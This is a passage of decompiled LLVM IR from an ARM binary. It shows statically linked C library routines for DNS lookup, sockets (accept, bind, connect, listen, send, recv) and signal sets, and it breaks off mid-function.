  store i32 %v0_28350, i32* %r0.global-to-local, align 4
  %v2_28358 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_28358, i32* @sb, align 4
  %v7_28398 = icmp eq i32 %tmp9, 5
  br label %dec_label_pc_2835c

dec_label_pc_2835c:                               ; preds = %dec_label_pc_283b0, %dec_label_pc_28340
  store i32 %v2_28358, i32* %r2.global-to-local, align 4
  store i32 %v2_28340, i32* %r3.global-to-local, align 4
  %v0_28368 = load i32, i32* @r5, align 4
  store i32 %v0_28368, i32* %r0.global-to-local, align 4
  %v4_2836c = inttoptr i32 %v0_28368 to i8*
  %v5_2836c = call i32 @__dns_lookup(i8* %v4_2836c, i32 28, i32 %v2_28358, i32 %v2_28340)
  store i32 %v5_2836c, i32* @r4, align 4
  %v1_28370 = icmp slt i32 %v5_2836c, 0
  %v0_28374 = load i32, i32* @sl, align 4
  store i32 %v0_28374, i32* %r2.global-to-local, align 4
  %v0_28378 = load i32, i32* @r7, align 4
  %v1_28378 = add i32 %v0_28378, 1
  store i32 %v1_28378, i32* @r7, align 4
  %v0_2837c = load i32, i32* @r5, align 4
  store i32 %v0_2837c, i32* %r0.global-to-local, align 4
  br i1 %v1_28370, label %dec_label_pc_28438, label %dec_label_pc_28384

dec_label_pc_28384:                               ; preds = %dec_label_pc_2835c
  %v3_28384 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_28384, i32* @r1, align 4
  %v2_28388 = call i32 @strncpy(i32 %v0_2837c, i32 %v3_28384)
  %v3_2838c = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_2838c, i32* @r0, align 4
  %v0_28390 = call i32 @free()
  store i32 %v0_28390, i32* %r0.global-to-local, align 4
  %v0_2839c = load i32, i32* @r4, align 4
  store i32 %v0_2839c, i32* %r2.global-to-local, align 4
  %v0_283a0 = load i32, i32* @r5, align 4
  store i32 %v0_283a0, i32* @r3, align 4
  br i1 %v7_28398, label %dec_label_pc_283a8, label %dec_label_pc_283e0

dec_label_pc_283a8:                               ; preds = %dec_label_pc_28384
  %v0_283a8 = load i32, i32* @r7, align 4
  %v8_283ac = icmp sgt i32 %v0_283a8, 5
  br i1 %v8_283ac, label %dec_label_pc_283d4, label %dec_label_pc_283b0

dec_label_pc_283b0:                               ; preds = %dec_label_pc_283a8
  store i32 %tmp8, i32* @r1, align 4
  %v3_283b4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_283b4, i32* %r0.global-to-local, align 4
  %v2_283bc = call i32 @__decode_dotted(i32 %v3_283b4, i32 %tmp8)
  store i32 %v2_283bc, i32* @r4, align 4
  %v3_283c4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_283c4, i32* @r0, align 4
  %v0_283c8 = call i32 @free()
  store i32 %v0_283c8, i32* %r0.global-to-local, align 4
  %v0_283cc = load i32, i32* @r4, align 4
  %v1_283cc = icmp slt i32 %v0_283cc, 0
  br i1 %v1_283cc, label %dec_label_pc_283d4, label %dec_label_pc_2835c

dec_label_pc_283d4:                               ; preds = %dec_label_pc_283b0, %dec_label_pc_283a8
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_28440

dec_label_pc_283e0:                               ; preds = %dec_label_pc_28384
  %v7_283e0 = icmp eq i32 %tmp9, 28
  br i1 %v7_283e0, label %dec_label_pc_283e8, label %dec_label_pc_28430

dec_label_pc_283e8:                               ; preds = %dec_label_pc_283e0
  store i32 16, i32* @r2, align 4
  %v0_283f0 = load i32, i32* @r8, align 4
  store i32 %v0_283f0, i32* @r0, align 4
  %v0_283f4 = call i32 @memcpy()
  store i32 10, i32* %r3.global-to-local, align 4
  store i32 %v1_282c8, i32* %r2.global-to-local, align 4
  %v1_28400 = load i32, i32* @r6, align 4
  %v2_28400 = add i32 %v1_28400, 8
  %v3_28400 = inttoptr i32 %v2_28400 to i32*
  store i32 10, i32* %v3_28400, align 4
  %v0_28404 = load i32, i32* %r3.global-to-local, align 4
  %v1_28404 = add i32 %v0_28404, 6
  store i32 %v1_28404, i32* %r3.global-to-local, align 4
  %v1_28408 = load i32, i32* @r6, align 4
  %v2_28408 = add i32 %v1_28408, 12
  %v3_28408 = inttoptr i32 %v2_28408 to i32*
  store i32 %v1_28404, i32* %v3_28408, align 4
  %v3_2840c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_2840c, i32* @r0, align 4
  %v0_28410 = load i32, i32* @r5, align 4
  %v1_28410 = load i32, i32* @r6, align 4
  %v2_28410 = inttoptr i32 %v1_28410 to i32*
  store i32 %v0_28410, i32* %v2_28410, align 4
  %v0_28414 = load i32, i32* %r2.global-to-local, align 4
  %v1_28414 = load i32, i32* @r6, align 4
  %v2_28414 = add i32 %v1_28414, 16
  %v3_28414 = inttoptr i32 %v2_28414 to i32*
  store i32 %v0_28414, i32* %v3_28414, align 4
  %v0_28418 = call i32 @free()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp14, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_28428 = load i32, i32* @r6, align 4
  store i32 %v0_28428, i32* %v2_2820c, align 4
  %v0_28440.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_28440

dec_label_pc_28430:                               ; preds = %dec_label_pc_283e0
  %v3_28430 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_28430, i32* @r0, align 4
  %v0_28434 = call i32 @free()
  store i32 %v0_28434, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_28438

dec_label_pc_28438:                               ; preds = %dec_label_pc_2835c, %dec_label_pc_28338, %dec_label_pc_28430
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_28440

dec_label_pc_28440:                               ; preds = %dec_label_pc_283e8, %dec_label_pc_283d4, %dec_label_pc_28438
  %v0_28440 = phi i32 [ %v0_28440.pre, %dec_label_pc_283e8 ], [ 3, %dec_label_pc_283d4 ], [ 1, %dec_label_pc_28438 ]
  %v1_28440 = load i32, i32* @fp, align 4
  %v2_28440 = inttoptr i32 %v1_28440 to i32*
  store i32 %v0_28440, i32* %v2_28440, align 4
  br label %dec_label_pc_2844c

dec_label_pc_28448:                               ; preds = %dec_label_pc_28200, %dec_label_pc_28214
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2844c

dec_label_pc_2844c:                               ; preds = %bb, %bb30, %dec_label_pc_28288, %dec_label_pc_2826c, %dec_label_pc_28440, %dec_label_pc_28308, %dec_label_pc_281e0, %dec_label_pc_28448
  store i32 %v3_281b8, i32* @r4, align 4
  store i32 %v6_281b8, i32* @r5, align 4
  store i32 %v9_281b8, i32* @r6, align 4
  store i32 %v12_281b8, i32* @r7, align 4
  store i32 %v15_281b8, i32* @r8, align 4
  store i32 %v18_281b8, i32* @sb, align 4
  store i32 %v21_281b8, i32* @sl, align 4
  store i32 %v24_281b8, i32* @fp, align 4
  %v1_28454 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_28454

; uselistorder directives
  uselistorder i32 %v2_28340, { 1, 0, 2, 3 }
  uselistorder i32 %v1_282c8, { 2, 1, 0, 3 }
  uselistorder i32 %v1_2829c, { 1, 0 }
  uselistorder i32 %tmp14, { 4, 3, 0, 2, 1 }
  uselistorder i32 %tmp8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 22, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 12, 11, 14, 13, 15, 17, 16, 18, 20, 19, 21, 23, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_2844c, { 7, 4, 5, 1, 2, 3, 0, 6 }
  uselistorder label %dec_label_pc_28448, { 1, 0 }
  uselistorder label %dec_label_pc_28440, { 2, 0, 1 }
  uselistorder label %dec_label_pc_28438, { 2, 0, 1 }
  uselistorder label %dec_label_pc_28298, { 2, 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  store i32 2, i32* @r1, align 4
  %v0_28464 = call i32 @__GI_gethostbyname2()
  ret i32 %v0_28464
}

define i32 @__GI_gethostbyname2() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_28474 = load i32, i32* @r4, align 4
  %v6_28474 = load i32, i32* @r5, align 4
  %v0_2847c = load i32, i32* @r0, align 4
  store i32 %v0_2847c, i32* @r4, align 4
  %v0_28480 = load i32, i32* @r1, align 4
  store i32 %v0_28480, i32* @r5, align 4
  %v0_28484 = call i32 @__GI___h_errno_location()
  %v0_284ac = load i32, i32* @r4, align 4
  %v2_284b0 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_284b0, i32* @ip, align 4
  %v0_284b4 = load i32, i32* @r5, align 4
  %v8_284bc = call i32 @gethostbyname2_r(i32 %v0_284ac, i32 %v0_284b4, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55656) to i32*), i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55216))
  %v3_284c0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_28474, i32* @r4, align 4
  store i32 %v6_28474, i32* @r5, align 4
  ret i32 %v3_284c0

; uselistorder directives
  uselistorder i32 (i32, i32, i32*, i32)* @gethostbyname2_r, { 2, 0, 1 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_284dc = load i32, i32* @r7, align 4
  store i32 %v3_284dc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_28504, label %dec_label_pc_284f4

dec_label_pc_284f4:                               ; preds = %entry
  %v0_284f4 = call i32 @__GI___errno_location()
  %v0_284f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_284f8 = sub i32 0, %v0_284f8
  %v2_284fc = inttoptr i32 %v0_284f4 to i32*
  store i32 %v1_284f8, i32* %v2_284fc, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_28508.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_28504

dec_label_pc_28504:                               ; preds = %entry, %dec_label_pc_284f4
  %v2_28508 = phi i32 [ %v3_284dc, %entry ], [ %v2_28508.pre, %dec_label_pc_284f4 ]
  %v0_28504 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_284f4 ]
  store i32 %v2_28508, i32* @r7, align 4
  ret i32 %v0_28504

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_28504, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_28514 = load i32, i32* @r7, align 4
  store i32 %v3_28514, i32* %stack_var_-8, align 4
  %v0_28520 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_28520, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_28520, -4095
  br i1 %tmp, label %dec_label_pc_28540, label %dec_label_pc_28530

dec_label_pc_28530:                               ; preds = %entry
  %v0_28530 = call i32 @__GI___errno_location()
  %v0_28534 = load i32, i32* %r7.global-to-local, align 4
  %v1_28534 = sub i32 0, %v0_28534
  %v2_28538 = inttoptr i32 %v0_28530 to i32*
  store i32 %v1_28534, i32* %v2_28538, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_28540.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_28540

dec_label_pc_28540:                               ; preds = %entry, %dec_label_pc_28530
  %v1_28544 = phi i32 [ %v0_28520, %entry ], [ -1, %dec_label_pc_28530 ]
  %v2_28540 = phi i32 [ %v3_28514, %entry ], [ %v2_28540.pre, %dec_label_pc_28530 ]
  store i32 %v2_28540, i32* @r7, align 4
  ret i32 %v1_28544

; uselistorder directives
  uselistorder i32 %v0_28520, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_28540, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_2854c = load i32, i32* @r7, align 4
  store i32 %v3_2854c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_28574, label %dec_label_pc_28564

dec_label_pc_28564:                               ; preds = %entry
  %v0_28564 = call i32 @__GI___errno_location()
  %v0_28568 = load i32, i32* %r7.global-to-local, align 4
  %v1_28568 = sub i32 0, %v0_28568
  %v2_2856c = inttoptr i32 %v0_28564 to i32*
  store i32 %v1_28568, i32* %v2_2856c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_28578.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_28574

dec_label_pc_28574:                               ; preds = %entry, %dec_label_pc_28564
  %v2_28578 = phi i32 [ %v3_2854c, %entry ], [ %v2_28578.pre, %dec_label_pc_28564 ]
  %v0_28574 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_28564 ]
  store i32 %v2_28578, i32* @r7, align 4
  ret i32 %v0_28574

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_28574, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_285b8, label %dec_label_pc_285a8

dec_label_pc_285a8:                               ; preds = %entry
  %v0_285a8 = call i32 @__GI___errno_location()
  %v0_285ac = load i32, i32* %r4.global-to-local, align 4
  %v1_285ac = sub i32 0, %v0_285ac
  %v2_285b0 = inttoptr i32 %v0_285a8 to i32*
  store i32 %v1_285ac, i32* %v2_285b0, align 4
  br label %dec_label_pc_285b8

dec_label_pc_285b8:                               ; preds = %entry, %dec_label_pc_285a8
  %v1_285c0 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_285a8 ]
  ret i32 %v1_285c0

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_285b8, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_285c8 = load i32, i32* @r7, align 4
  store i32 %v3_285c8, i32* %stack_var_-8, align 4
  %v0_285d4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_285d4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_285d4, -4095
  br i1 %tmp, label %dec_label_pc_285f4, label %dec_label_pc_285e4

dec_label_pc_285e4:                               ; preds = %entry
  %v0_285e4 = call i32 @__GI___errno_location()
  %v0_285e8 = load i32, i32* %r7.global-to-local, align 4
  %v1_285e8 = sub i32 0, %v0_285e8
  %v2_285ec = inttoptr i32 %v0_285e4 to i32*
  store i32 %v1_285e8, i32* %v2_285ec, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_285f4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_285f4

dec_label_pc_285f4:                               ; preds = %entry, %dec_label_pc_285e4
  %v1_285f8 = phi i32 [ %v0_285d4, %entry ], [ -1, %dec_label_pc_285e4 ]
  %v2_285f4 = phi i32 [ %v3_285c8, %entry ], [ %v2_285f4.pre, %dec_label_pc_285e4 ]
  store i32 %v2_285f4, i32* @r7, align 4
  ret i32 %v1_285f8

; uselistorder directives
  uselistorder i32 %v0_285d4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_285f4, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_285fc = load i32, i32* @r7, align 4
  store i32 %v3_285fc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_28624, label %dec_label_pc_28614

dec_label_pc_28614:                               ; preds = %entry
  %v0_28614 = call i32 @__GI___errno_location()
  %v0_28618 = load i32, i32* %r7.global-to-local, align 4
  %v1_28618 = sub i32 0, %v0_28618
  %v2_2861c = inttoptr i32 %v0_28614 to i32*
  store i32 %v1_28618, i32* %v2_2861c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_28628.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_28624

dec_label_pc_28624:                               ; preds = %entry, %dec_label_pc_28614
  %v2_28628 = phi i32 [ %v3_285fc, %entry ], [ %v2_28628.pre, %dec_label_pc_28614 ]
  %v0_28624 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_28614 ]
  store i32 %v2_28628, i32* @r7, align 4
  ret i32 %v0_28624

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_28624, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_28634 = load i32, i32* @r4, align 4
  store i32 %v3_28634, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_28664, label %dec_label_pc_28654

dec_label_pc_28654:                               ; preds = %entry
  %v0_28654 = call i32 @__GI___errno_location()
  %v0_28658 = load i32, i32* %r4.global-to-local, align 4
  %v1_28658 = sub i32 0, %v0_28658
  %v2_2865c = inttoptr i32 %v0_28654 to i32*
  store i32 %v1_28658, i32* %v2_2865c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_28668.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_28664

dec_label_pc_28664:                               ; preds = %entry, %dec_label_pc_28654
  %v2_28668 = phi i32 [ %v3_28634, %entry ], [ %v2_28668.pre, %dec_label_pc_28654 ]
  %v0_28664 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_28654 ]
  store i32 %v2_28668, i32* @r4, align 4
  ret i32 %v0_28664

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_28664, { 1, 0 }
}

define i32 @__libc_recvmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_28670 = load i32, i32* @r7, align 4
  store i32 %v3_28670, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_28698, label %dec_label_pc_28688

dec_label_pc_28688:                               ; preds = %entry
  %v0_28688 = call i32 @__GI___errno_location()
  %v0_2868c = load i32, i32* %r7.global-to-local, align 4
  %v1_2868c = sub i32 0, %v0_2868c
  %v2_28690 = inttoptr i32 %v0_28688 to i32*
  store i32 %v1_2868c, i32* %v2_28690, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_2869c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_28698

dec_label_pc_28698:                               ; preds = %entry, %dec_label_pc_28688
  %v2_2869c = phi i32 [ %v3_28670, %entry ], [ %v2_2869c.pre, %dec_label_pc_28688 ]
  %v0_28698 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_28688 ]
  store i32 %v2_2869c, i32* %r7.global-to-local, align 4
  ret i32 %v0_28698

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_28698, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_286a8 = load i32, i32* @r7, align 4
  store i32 %v3_286a8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_286d0, label %dec_label_pc_286c0

dec_label_pc_286c0:                               ; preds = %entry
  %v0_286c0 = call i32 @__GI___errno_location()
  %v0_286c4 = load i32, i32* %r7.global-to-local, align 4
  %v1_286c4 = sub i32 0, %v0_286c4
  %v2_286c8 = inttoptr i32 %v0_286c0 to i32*
  store i32 %v1_286c4, i32* %v2_286c8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_286d4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_286d0

dec_label_pc_286d0:                               ; preds = %entry, %dec_label_pc_286c0
  %v2_286d4 = phi i32 [ %v3_286a8, %entry ], [ %v2_286d4.pre, %dec_label_pc_286c0 ]
  %v0_286d0 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_286c0 ]
  store i32 %v2_286d4, i32* %r7.global-to-local, align 4
  ret i32 %v0_286d0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_286d0, { 1, 0 }
}

define i32 @__libc_sendmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_286e0 = load i32, i32* @r7, align 4
  store i32 %v3_286e0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_28708, label %dec_label_pc_286f8

dec_label_pc_286f8:                               ; preds = %entry
  %v0_286f8 = call i32 @__GI___errno_location()
  %v0_286fc = load i32, i32* %r7.global-to-local, align 4
  %v1_286fc = sub i32 0, %v0_286fc
  %v2_28700 = inttoptr i32 %v0_286f8 to i32*
  store i32 %v1_286fc, i32* %v2_28700, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_2870c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_28708

dec_label_pc_28708:                               ; preds = %entry, %dec_label_pc_286f8
  %v2_2870c = phi i32 [ %v3_286e0, %entry ], [ %v2_2870c.pre, %dec_label_pc_286f8 ]
  %v0_28708 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_286f8 ]
  store i32 %v2_2870c, i32* %r7.global-to-local, align 4
  ret i32 %v0_28708

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_28708, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_28714 = load i32, i32* @r4, align 4
  store i32 %v3_28714, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_28744, label %dec_label_pc_28734

dec_label_pc_28734:                               ; preds = %entry
  %v0_28734 = call i32 @__GI___errno_location()
  %v0_28738 = load i32, i32* %r4.global-to-local, align 4
  %v1_28738 = sub i32 0, %v0_28738
  %v2_2873c = inttoptr i32 %v0_28734 to i32*
  store i32 %v1_28738, i32* %v2_2873c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_28748.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_28744

dec_label_pc_28744:                               ; preds = %entry, %dec_label_pc_28734
  %v2_28748 = phi i32 [ %v3_28714, %entry ], [ %v2_28748.pre, %dec_label_pc_28734 ]
  %v0_28744 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_28734 ]
  store i32 %v2_28748, i32* %r4.global-to-local, align 4
  ret i32 %v0_28744

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_28744, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_28788, label %dec_label_pc_28778

dec_label_pc_28778:                               ; preds = %entry
  %v0_28778 = call i32 @__GI___errno_location()
  %v0_2877c = load i32, i32* %r4.global-to-local, align 4
  %v1_2877c = sub i32 0, %v0_2877c
  %v2_28780 = inttoptr i32 %v0_28778 to i32*
  store i32 %v1_2877c, i32* %v2_28780, align 4
  br label %dec_label_pc_28788

dec_label_pc_28788:                               ; preds = %entry, %dec_label_pc_28778
  %v1_28790 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_28778 ]
  ret i32 %v1_28790

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_28788, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_28798 = load i32, i32* @r7, align 4
  store i32 %v3_28798, i32* %stack_var_-8, align 4
  %v0_287a4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_287a4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_287a4, -4095
  br i1 %tmp, label %dec_label_pc_287c4, label %dec_label_pc_287b4

dec_label_pc_287b4:                               ; preds = %entry
  %v0_287b4 = call i32 @__GI___errno_location()
  %v0_287b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_287b8 = sub i32 0, %v0_287b8
  store i32 %v1_287b8, i32* @r3, align 4
  %v2_287bc = inttoptr i32 %v0_287b4 to i32*
  store i32 %v1_287b8, i32* %v2_287bc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_287c4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_287c4

dec_label_pc_287c4:                               ; preds = %entry, %dec_label_pc_287b4
  %v1_287c8 = phi i32 [ %v0_287a4, %entry ], [ -1, %dec_label_pc_287b4 ]
  %v2_287c4 = phi i32 [ %v3_28798, %entry ], [ %v2_287c4.pre, %dec_label_pc_287b4 ]
  store i32 %v2_287c4, i32* @r7, align 4
  ret i32 %v1_287c8

; uselistorder directives
  uselistorder i32 %v0_287a4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_287c4, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_287e8, label %dec_label_pc_287e0

dec_label_pc_287e0:                               ; preds = %entry
  %v7_287e4 = icmp slt i32 %arg1, 65
  br i1 %v7_287e4, label %dec_label_pc_287fc, label %dec_label_pc_287e8

dec_label_pc_287e8:                               ; preds = %dec_label_pc_287e0, %entry
  %v0_287e8 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_287f4 = inttoptr i32 %v0_287e8 to i32*
  store i32 22, i32* %v2_287f4, align 4
  %v0_28804.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_28804

dec_label_pc_287fc:                               ; preds = %dec_label_pc_287e0
  %v0_287fc = call i32 @__sigaddset()
  store i32 %v0_287fc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_28804

dec_label_pc_28804:                               ; preds = %dec_label_pc_287e8, %dec_label_pc_287fc
  %v0_28804 = phi i32 [ %v0_28804.pre, %dec_label_pc_287e8 ], [ %v0_287fc, %dec_label_pc_287fc ]
  ret i32 %v0_28804

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_28804, { 1, 0 }
}

define i32 @__GI_sigdelset(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_2882c, label %dec_label_pc_28824

dec_label_pc_28824:                               ; preds = %entry
  %v7_28828 = icmp slt i32 %arg1, 65
